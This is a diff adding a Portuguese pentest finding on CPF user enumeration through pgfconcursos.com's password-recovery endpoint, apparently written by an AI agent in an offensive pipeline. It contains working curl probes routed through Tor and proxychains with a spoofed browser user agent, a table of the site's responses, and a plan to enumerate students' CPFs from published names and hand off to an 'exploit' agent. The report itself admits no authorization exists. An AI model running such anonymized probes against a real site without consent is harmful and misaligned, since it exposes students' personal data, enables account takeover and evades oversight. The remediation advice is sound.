@@ -1,0 +1,89 @@
+# F-001 Enumeração de usuários (CPF) via endpoint de recuperação de senha
+Alvo: pgfconcursos.com (45.151.121.124 via Hostinger/LiteSpeed, PHP 7.3.33)
+Severidade: Média
+Timestamp: 2026-08-27T15:05:00Z
+Autor: webapp (Tor + proxychains4, UA Chrome 120 real)
+
+## Reprodução
+POST /portal_recuperar_senha com dois parâmetros obrigatórios: `emailrecovery`
+(email) e `cpf` (CPF, sem pontuação). Resposta vem como flash message na
+página /recuperar-senha após redirect 302 (seguir com cookie jar + -L).
+
+```bash
+UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
+
+# CPF inválido (checksum) -> mensagem A
+proxychains4 -q curl -s -m 25 -A "$UA" -c /tmp/cj.txt -b /tmp/cj.txt -L \
+  -X POST "https://pgfconcursos.com/portal_recuperar_senha" \
+  --data-urlencode "emailrecovery=naoexiste@invaliddomain.xyz" \
+  --data-urlencode "cpf=11111111111"
+
+# CPF com checksum válido mas NÃO cadastrado -> mensagem B
+proxychains4 -q curl -s -m 25 -A "$UA" -c /tmp/cj.txt -b /tmp/cj.txt -L \
+  -X POST "https://pgfconcursos.com/portal_recuperar_senha" \
+  --data-urlencode "emailrecovery=naoexiste@invaliddomain.xyz" \
+  --data-urlencode "cpf=11144477735"
+```
+
+## Output
+Mensagens distintas dentro de `<div id="..." class="alert alert-...">`:
+
+| CPF enviado            | Mensagem retornada       |
+|------------------------|--------------------------|
+| 11111111111 (checksum inválido) | `CPF não cadastrado!`    |
+| 00000000000 (checksum inválido) | `CPF não cadastrado!`    |
+| 52998247725 (checksum inválido) | `CPF não cadastrado!`    |
+| 11144477735 (checksum válido, fora do DB) | `Cadastro não encontrado!`|
+| 12345678909 (checksum válido, fora do DB) | `Cadastro não encontrado!`|
+
+Headers do redirect:
+```
+HTTP/2 302
+location: /recuperar-senha
+content-length: 0
+```
+
+## Interpretação
+A aplicação valida o checksum do CPF e diferencia:
+  (1) CPF inválido (checksum) -> "CPF não cadastrado!"
+  (2) CPF válido mas não presente no banco -> "Cadastro não encontrado!"
+  (3) CPF válido E presente no banco -> mensagem distinta (presumivelmente
+      "e-mail não confere" se o e-mail estiver errado, ou disparo do e-mail
+      de reset se correto).
+A existência de mensagens diferentes conforme o estado do CPF no banco
+caracteriza ORACLE de enumeração: um atacante consegue distinguir, via a
+mensagem de retorno, quais CPFs estão cadastrados como alunos (PII
+sensível no Brasil, equivalente a SSN). O fluxo confirma também que o CPF
+é a chave de lookup do aluno.
+
+## Impacto
+- Enumeração de CPFs cadastrados (alunos do curso) — vazamento de PII
+  (cadastro de alunos do PGF Concursos).
+- Confirmação/validação de CPFs-alvo para ataques direcionados
+  (phishing, sequestro de conta via fluxo de reset combinado com e-mail).
+- Assistência a account takeover: conhecendo CPF + e-mail da vítima é
+  possível disparar o reset de senha.
+- Não há CAPTCHA nem rate-limit aparente no endpoint (ver F-005),
+  ampliando a janela de automação.
+
+Observação: o número de CPFs válidos (~10^9 com checksum) torna a busca
+exaustiva inviável, mas enumeração direcionada (nomes de alunos divulgados
+na página /alunos-aprovados + geração de CPFs plausíveis) é factível e
+suficiente para confirmar matrículas.
+
+## Recomendação
+- Retornar uma única mensagem genérica para TODOS os casos de
+  recuperação (ex.: "Se os dados estiverem corretos, enviaremos um
+  e-mail com instruções."), sem distinguir inválido / não-cadastrado /
+  cadastrado.
+- Não revelar qual campo (e-mail ou CPF) falhou.
+- Implementar CAPTCHA e rate-limiting no endpoint (ver F-005).
+- Considerar bloqueio/geoblocking (somente IPs BR) e notificação ao
+  titular do CPF via outro canal quando reset for disparado.
+
+## Próximo passo
+Confirmar a "terceira mensagem" (CPF cadastrado) requer um CPF real de
+aluno — não disponível sem autorização/conta de teste. Recomenda-se, em
+fase autorizada com conta de teste, validar a enumeração completa e o
+fluxo de reset (token predizível? tempo de validade?). Delegar a
+`exploit` caso credencial/conta de teste seja autorizada.
